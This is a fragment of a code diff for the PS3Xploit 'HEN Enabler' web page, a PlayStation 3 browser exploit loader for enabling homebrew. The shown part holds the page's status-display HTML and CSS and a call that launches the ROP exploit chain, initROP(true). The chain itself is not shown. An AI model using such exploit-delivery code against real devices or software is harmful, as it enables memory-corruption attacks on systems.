+        '<html> <head> <title>PS3Xploit - H\u24d4N Enabler</title> <style>html{color: #fff; left: 100%; overflow: hidden; position: relative;}*{font-weight: 100; font-size: 32px !important;}#a{display: table; height: 100%; left: -100%; position: relative; width: 100%; text-align: center;}#b{display: table-cell; text-align: center; vertical-align: middle; width: 100%;}#c{-webkit-animation: s 2s infinite; -webkit-border-radius: 10px; background: #6f0; display: inline-block; height: 48px; right: 24px; position: absolute; top: 28px; width: 48px;}#c.fail{background: #f00;}#d{position: relative; z-index: 1;}#result{-webkit-border-radius: 10px; background: #000; display: inline-block; font-weight: 700; padding: 32px; padding-right: 92px; position: relative;}@-webkit-keyframes s{0%{-webkit-transform: rotate(0);}100%, 90%{-webkit-transform: rotate(540deg);}}input{opacity: 0;}b{color: #f00;}s{color: #6f0; text-decoration: none; font-weight: 800;}</style> </head> <body> <div id="exploit"></div><div id="trigger"></div><div id="a"> <input type="radio" autofocus/> <div id="b"> <div id="result"> <div id="c"></div><div id="d">Enabling <s>H\u24d4N</s></div></div></div></div></body></html>'
+      );
+      setTimeout(function() {
+        initROP(true);
+      }, 0);
+    </script>
+  </body>
+</html>
